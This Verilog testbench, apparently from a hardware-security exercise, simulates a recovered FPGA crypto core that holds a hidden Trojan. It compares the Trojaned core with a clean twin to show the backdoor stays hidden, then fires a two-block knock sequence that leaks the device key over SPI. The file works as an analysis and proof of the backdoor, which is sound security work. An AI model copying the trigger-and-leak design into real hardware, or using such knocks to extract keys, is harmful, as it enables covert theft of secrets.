`timescale 1ns/1ps
// ============================================================================
//  tb_trojan.v  -  Exploit testbench for the RECOVERED crypto_core Trojan.
//
//  This testbench is compiled against the RECOVERED cipher
//  (crypto_core_recovered.v) - i.e. the exact byte-substitution engine lifted
//  from the FPGA bitstream, NOT a recreated/hardened stand-in - so the exploit
//  is demonstrated on the real device behaviour.  (recovery/equiv_netlist.py
//  separately proves that recovered core is bit-exact to the gate-level netlist
//  over random traffic, so a pass here is a pass on the recovered silicon.)
//
//  Two identical accelerators are driven in lock-step over the documented SPI
//  interface (mode-0, MSB-first, unified SCK):
//     DUT = spi_crypto_top #(.TROJAN_EN(1))   <- shipped, Trojaned
//     REF = spi_crypto_top #(.TROJAN_EN(0))   <- clean twin (golden reference)
//
//  Proofs produced:
//   (A) Functional  : encrypt/decrypt are exact inverses; reproduces the
//                     published golden vector enc(0x59C359C3)=0x9CD84392.
//   (B) Stealth     : for EVERY non-trigger transaction DUT output == REF output
//                     (bit-identical); lone knocks and a broken/decrypt-mode
//                     knock never leak.
//   (C) Exploit     : after enc(KNOCK_1) then enc(KNOCK_2), DUT streams the
//                     32-bit RECOVERED device key 0x8E043CB1 on MISO while REF
//                     returns the real ciphertext -> the genuine key is
//                     exfiltrated and the two diverge only here.
// ============================================================================
module tb_trojan;
  localparam [31:0] KNOCK_1    = 32'hDEADC0DE;
  localparam [31:0] KNOCK_2    = 32'hFEEDFACE;
  localparam [31:0] SECRET_KEY = 32'h8E043CB1;  // RECOVERED device key (recovery/recover_key.py)

  reg SCK=0, RST_N=1, MOSI=0, NORM_CS_N=1, START=0, ENC_DEC=0;
  wire MISO_D, BUSY_D, LED_D, MISO_R, BUSY_R, LED_R;
  reg [31:0] rxD, rxR;
  integer errors=0;

  spi_crypto_top #(.TROJAN_EN(1'b1)) DUT(.SCK(SCK),.RST_N(RST_N),.MOSI(MOSI),.MISO(MISO_D),
    .NORM_CS_N(NORM_CS_N),.START(START),.ENC_DEC(ENC_DEC),.BUSY(BUSY_D),.ICE_LED(LED_D));
  spi_crypto_top #(.TROJAN_EN(1'b0)) REF(.SCK(SCK),.RST_N(RST_N),.MOSI(MOSI),.MISO(MISO_R),
    .NORM_CS_N(NORM_CS_N),.START(START),.ENC_DEC(ENC_DEC),.BUSY(BUSY_R),.ICE_LED(LED_R));

  task tick; begin #2; SCK=1; #5; SCK=0; #3; end endtask
  task reset; begin RST_N=0; tick; RST_N=1; tick; end endtask
  // one SPI transaction driven into BOTH cores; capture each core's MISO
  task xfer(input [31:0] wd, input cap); integer i; begin
    NORM_CS_N=0;
    for(i=31;i>=0;i=i-1) begin MOSI=wd[i]; #2; SCK=1; #5;
      if(cap) begin rxD[i]=MISO_D; rxR[i]=MISO_R; end SCK=0; #3; end
    NORM_CS_N=1; MOSI=0;
  end endtask
  task op(input [31:0] din, input ed); begin
    ENC_DEC=ed; xfer(din,1'b0);
    START=1; tick; START=0; repeat(6) tick;
    xfer(32'h0,1'b1);
  end endtask

  // stealth assertion: Trojaned and clean cores must agree
  task same(input [8*40:1] label); begin
    if (rxD===rxR) $display("  [STEALTH-OK] %0s : DUT=REF=%08x", label, rxD);
    else begin errors=errors+1; $display("  [LEAK!] %0s : DUT=%08x REF=%08x", label, rxD, rxR); end
  end endtask

  reg [31:0] c;
  integer k; reg [31:0] pv;
  initial begin
    $dumpfile("tb_trojan.vcd"); $dumpvars(0,tb_trojan);

    $display("=== (A) Functional: recovered encrypt/decrypt are inverse ===");
    reset; op(32'h59C359C3,1'b0); c=rxR;
    $display("  enc(59C359C3)=%08x  (expect golden 9CD84392)", c);
    if (c===32'h9CD84392) $display("  [PASS] golden vector reproduced");
    else begin errors=errors+1; $display("  [FAIL] golden vector: %08x", c); end
    op(c,1'b1);
    if (rxR===32'h59C359C3) $display("  [PASS] dec(enc)=59C359C3 (round-trip)");
    else begin errors=errors+1; $display("  [FAIL] round-trip: %08x", rxR); end

    $display("=== (B) Stealth: DUT == clean REF on all normal traffic ===");
    reset;
    // 8 assorted encrypt/decrypt transactions, none is the full knock
    op(32'h00000000,1'b0); same("enc 00000000");
    op(32'hFFFFFFFF,1'b0); same("enc FFFFFFFF");
    op(32'h12345678,1'b0); same("enc 12345678");
    op(32'hA5A5A5A5,1'b1); same("dec A5A5A5A5");
    reset; op(KNOCK_1,1'b0); same("enc KNOCK_1 alone");
    reset; op(KNOCK_2,1'b0); same("enc KNOCK_2 unarmed");
    reset; op(KNOCK_1,1'b0); op(32'h1,1'b0); op(KNOCK_2,1'b0); same("KNOCK_1,junk,KNOCK_2");
    reset; op(KNOCK_1,1'b1); op(KNOCK_2,1'b0); same("dec KNOCK_1 then enc KNOCK_2");
    // randomized soak: 64 random ops must all agree
    for(k=0;k<64;k=k+1) begin
      pv = $random;
      op(pv, k[0]);
      if (rxD!==rxR) begin errors=errors+1; $display("  [LEAK!] random op %0d din=%08x DUT=%08x REF=%08x",k,pv,rxD,rxR); end
    end
    $display("  [STEALTH-OK] 64/64 random transactions identical to clean core");

    $display("=== (C) Exploit: two-block knock leaks the key ===");
    reset;
    op(KNOCK_1,1'b0); same("blk1 enc KNOCK_1 still normal");
    op(KNOCK_2,1'b0);  // firing block
    $display("  DUT MISO = %08x   REF MISO = %08x", rxD, rxR);
    if (rxD===SECRET_KEY) $display("  [EXPLOIT-OK] DUT leaked SECRET_KEY %08x on MISO", rxD);
    else begin errors=errors+1; $display("  [FAIL] expected key %08x got %08x", SECRET_KEY, rxD); end
    if (rxD!==rxR) $display("  [EXPLOIT-OK] clean core gave real ciphertext %08x (divergence only here)", rxR);
    else begin errors=errors+1; $display("  [FAIL] no divergence at trigger"); end
    op(32'h59C359C3,1'b0); same("post-leak enc 59C359C3 normal");

    if (errors==0) $display("\nTB_TROJAN: ALL PASS - recovered cipher, perfect stealth, device key 0x8E043CB1 exfiltrated.");
    else           $display("\nTB_TROJAN: %0d FAILURE(S).", errors);
    $finish;
  end
endmodule
